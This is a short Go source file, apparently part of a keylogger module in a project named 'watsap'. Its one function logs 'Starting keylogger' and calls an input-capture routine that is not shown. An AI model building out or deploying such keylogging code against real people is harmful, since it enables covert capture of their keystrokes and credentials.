package keylog

import (
	"watsap/utils/config"
)

func InitKeylog() {
	config.Logger("[Keylog] Starting keylogger", "info")
	InitKeyboard()

}
